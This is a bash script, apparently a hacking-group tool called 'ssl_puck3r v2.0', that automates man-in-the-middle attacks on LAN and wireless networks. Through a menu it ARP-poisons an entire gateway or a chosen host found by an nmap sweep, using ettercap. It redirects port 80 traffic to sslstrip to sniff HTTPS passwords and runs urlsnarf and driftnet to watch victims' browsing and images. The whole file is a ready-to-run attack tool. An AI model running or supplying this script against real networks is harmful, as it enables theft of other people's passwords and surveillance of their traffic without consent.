#!/bin/bash

# ssl_puck3r v2.0
# Revised 04/24/14
# Created By: n1tr0g3n & R4v3N
# Special thanks to TAPE and Acexor for helping test out the script during the coding stages!
# http://www.top-hat-sec.com // http://www.n1tr0g3n.com // http://www.red-team-labs.com // http://www.teamctfu.com/

clear
# TAPES COLORZ (thanks TAPE!)
STD=$(echo -e "\e[0;0;0m")  #Revert fonts to standard colour/format
RED=$(echo -e "\e[1;31m")  #Alter fonts to red bold
REDN=$(echo -e "\e[0;31m")  #Alter fonts to red normal
GRN=$(echo -e "\e[1;32m")  #Alter fonts to green bold
GRNN=$(echo -e "\e[0;32m")  #Alter fonts to green normal
BLU=$(echo -e "\e[1;36m")  #Alter fonts to blue bold
BLUN=$(echo -e "\e[0;36m")  #Alter fonts to blue normal
DATE=$(date +%h%d-%Y-%H%M)
DGATEWAY=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
GATELAN()
{
echo ""
echo $GRN"[*] Starting attack on Gateway"
route -n | grep 'UG[ \t]' | awk '{print $2}'
sleep 2
#This will start URLSnarf to show the websites the victim browses
xterm -e urlsnarf -i $IFACE &
#this command will set up all redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#This command will start ettercap
ettercap -L $DATE -T -q -i $IFACE -M ARP:REMOTE // // &
#This command will start SSLStrip to start sniffing https:// passwords
xterm -e sslstrip -a -l 10000 &
xterm -e driftnet -i $IFACE &
echo
echo "[*] Press ENTER to stop session"
read ENTERKEY
killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
}

GATEWIFI(){
echo ""
#This will allow you to forward packets from the router
echo $GRN"[*] Starting attack on gateway"
route -n | grep 'UG[ \t]' | awk '{print $2}'
sleep 2
#This will start URLSnarf to show the websites the victim browses
xterm -e urlsnarf -i $IFACE &
#this command will set up all redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#This command will start ettercap
ettercap -L $DATE -T -q -i $IFACE -M arp:remote /$DGATEWAY/ // &
#sudo xterm -e ettercap -TqM ARP:REMOTE // // & -----> command for LAN
#This command will start SSLStrip to start sniffing https:// passwords
xterm -e sslstrip -a -l 10000 &
xterm -e driftnet -i $IFACE &
echo "[*] Press ENTER to stop session"
read ENTERKEY
killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
}
SINGLELAN(){
#This will allow you to forward packets from the router
echo ""
echo "Possible Targets:"
nmap -PR -sn $DGATEWAY/24 | sed /'Starting'/d | sed /'MAC'/d | sed /Host/d | sed /'done'/d | sed /addresses/d | sed '2 d' | awk '{print $5}'
echo ""
echo -n $RED"[*] Please type the IP of the target: "$GRN
read HOST3
echo ""
echo $GRN"[*] Starting Attack on Target Host"
sleep 2
#This will start URLSnarf to show the websites the victim browses
xterm -e urlsnarf -i $IFACE &
#this command will set up all redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#This command will start ettercap
ettercap -L $DATE -T -q -i $IFACE -M ARP:REMOTE /$DGATEWAY/ /$HOST3/ &
#This command will start SSLStrip to start sniffing https:// passwords
xterm -e sslstrip -a -l 10000 &
xterm -e driftnet -i $IFACE &
echo "Press ENTER to stop session"
read ENTERKEY
killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
}
SINGLEWIFI(){
#This will allow you to forward packets from the router
echo "Possible Targets:"
nmap -PR -sn $DGATEWAY/24 | sed /'Starting'/d | sed /'MAC'/d | sed /Host/d | sed /'done'/d | sed /addresses/d | sed '2 d' | awk '{print $5}'
echo ""
echo -n $RED"[*] Please type the IP of the target: "$GRN
read HOST4
echo ""
echo $GRN"[*] Starting Attack on Target Host"
#This will start URLSnarf to show the websites the victim browses
xterm -e urlsnarf -i $IFACE &
#this command will set up all redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#This command will start ettercap
ettercap -L $DATE -T -q -i $IFACE -M arp:remote /$DGATEWAY/ /$HOST4/ &
#This command will start SSLStrip to start sniffing https:// passwords
xterm -e sslstrip -a -l 10000 &
xterm -e driftnet -i $IFACE &
echo "[*] Press ENTER to stop session"
read ENTERKEY
killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
}
freset(){
echo ""
ifconfig | grep 'eth\|wlan\|ath\|ra\|rausb\|inet addr' | sed /RX/d
echo $RED""
echo -n "[*] Select Interface: (e.g. eth0): "$GRN
read IFACE
fmen
}
echo $RED'''
              .__           .__                   __    ________        
  ______ _____|  |   ______ |  |__  __ __   ____ |  | __\_____  \______ 
 /  ___//  ___/  |   \____ \|  |  \|  |  \_/ ___\|  |/ /  _(__  <_  __ \
 \___ \ \___ \|  |__ |  |_> >   Y  \  |  /\  \___|    <  /       \  | \/
/____  >____  >____/ |   __/|___|  /____/  \___  >__|_ \/______  /__|   
     \/     \/       |__|        \/            \/     \/       \/       
         All your https are belong to us // sslphuck3r v2.0
         	     http://www.top-hat-sec.com

     '''
echo "Default Gateway:" "$DGATEWAY"
echo $GRN"[*] Select Interface: (e.g. eth0) "
echo ""
#ifconfig | grep -B 1 Bcast | awk '{print $1, $2}' | tr -d '-' | cut -d : -f 2 | cut -d ' ' -f 1
ifconfig | grep 'eth\|wlan\|ath\|ra\|rausb\|inet addr' | sed /RX/d
echo $GRN""
read -p'''
[>]''' IFACE
fmen(){
IPFORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
echo ""
echo "Default Gateway: " "$DGATEWAY"
if [ "$IPFORWARD" = "1" ]; then
	echo "IP Forwarding: " $GRN"Enabled"
	elif [ "$IPFORWARD" = "0" ]; then
		echo "IP Forwarding: " $RED"Disabled"$GRN
else
	echo "IP Forwarding: " $BLU"Unknown"$GRN
fi
echo '''
[00] Change Adapter
[0] Disable IPv4 Forwarding
[1] Enable IPv4 Forwarding
[2] LAN - Entire Gateway
[3] WIRELESS - Entire Gateway
[4] LAN - Single Host
[5] WIRELESS - Single Host
'''
echo $RED""
read -p'''
[>] Select Menu Option: '''$GRN menopt
echo $GRN""
if [ "$menopt" = "00" ]; then
	freset
	elif [ "$menopt" = "0" ]; then
	echo "0" > /proc/sys/net/ipv4/ip_forward
    fmen
       	elif [ "$menopt" = "1" ]; then
    	echo "1" > /proc/sys/net/ipv4/ip_forward
    	fmen
    	elif [ "$menopt" = "2" ]; then
		GATELAN
		elif [ "$menopt" = "3" ]; then
		GATEWIFI
		elif [ "$menopt" = "4" ]; then
		SINGLELAN
		elif [ "$menopt" = "5" ]; then
		SINGLEWIFI
	else
	echo "Invalid Option"
	sleep 2
	fmen
fi
}
fmen
